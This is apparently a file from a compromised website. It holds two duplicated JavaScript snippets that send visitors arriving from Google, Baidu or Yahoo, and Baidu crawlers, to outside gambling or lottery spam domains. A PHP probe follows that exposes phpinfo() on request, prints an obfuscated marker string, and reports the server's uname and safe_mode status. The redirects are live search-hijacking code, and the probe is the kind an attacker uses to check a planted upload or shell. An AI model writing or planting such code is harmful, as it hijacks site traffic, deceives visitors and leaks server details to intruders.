<script language="javascript">
var s=document.referrer
var ua=navigator.userAgent;
if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0||ua.indexOf("Baidu")>0||ua.indexOf("baidu")>0 ) 
location.href="http://shishicaihouer.tumblr.com ";
</script>

<script language="javascript">
var s=document.referrer
var ua=navigator.userAgent;
if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0||ua.indexOf("Baidu")>0||ua.indexOf("baidu")>0 ) 
location.href="http://lebaijiayulecheng22.blog.com ";
</script>

<?php

if ($_GET['info']){

phpinfo();
}


echo '[tes'.'tou]-';
$uname = @php_uname();


 $SafeMode = @ini_get('safe_mode');



 if ($SafeMode == '') { $SafeMode = " SAFEMODE-OFF"; }

 else { $SafeMode = " SAFEMODE-[$SafeMode]"; }
 
  if ($SafeMode == 0) { $SafeMode = " SAFEMODE-OFF"; }
 
echo $uname.$SafeMode;

?>
